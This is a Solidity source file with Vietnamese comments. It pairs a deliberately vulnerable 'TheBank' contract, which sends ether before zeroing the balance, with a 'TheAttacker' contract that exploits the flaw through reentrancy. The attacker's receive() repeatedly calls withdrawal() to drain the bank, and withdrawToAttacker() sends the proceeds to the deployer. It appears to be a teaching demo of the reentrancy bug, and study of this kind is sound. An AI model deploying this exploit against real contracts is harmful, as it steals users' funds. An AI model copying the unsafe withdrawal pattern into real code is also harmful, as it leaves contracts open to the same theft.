// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TheBank {
    mapping(address => uint) theBalances;

    function deposit() public payable {
        require(msg.value >= 1 ether, "cannot deposit below 1 ether");
        theBalances[msg.sender] += msg.value;
    }

    function withdrawal() public {
        require(
            theBalances[msg.sender] >= 1 ether,
            "must have at least one ether"
        );
        uint bal = theBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: bal}("");  //hàm chuyển tiền cho người muốn rút 
                                                             //nhưng trước đó chưa cập nhật lại số tiền của họ sau khi rút
                                                             
        require(success, "transaction failed");
        theBalances[msg.sender] = 0;
    }

    function totalBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract TheAttacker {

    TheBank public theBank;
    address public attacker;

    constructor(address _thebankAddress) {
        theBank = TheBank(_thebankAddress);
        attacker = msg.sender; // Ghi nhớ địa chỉ của kẻ tấn công
    }

    receive() external payable {
        if (address(theBank).balance >= 1 ether) {
            theBank.withdrawal(); // Lặp lại hàm rút tiền đến khi quỹ cạn tiền
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "must send at least 1 ether to attack");
        theBank.deposit{value: 1 ether}();
        theBank.withdrawal();
    }

    function withdrawToAttacker() public {
        require(msg.sender == attacker, "Only attacker can withdraw");
        uint balance = address(this).balance;
        (bool success, ) = attacker.call{value: balance}("");
        require(success, "Withdraw to attacker failed");
    }

    function getBalances() public view returns (uint) {
        return address(this).balance;
    }

    function totalBalance() public view returns (uint) {
        return address(this).balance;
    }
}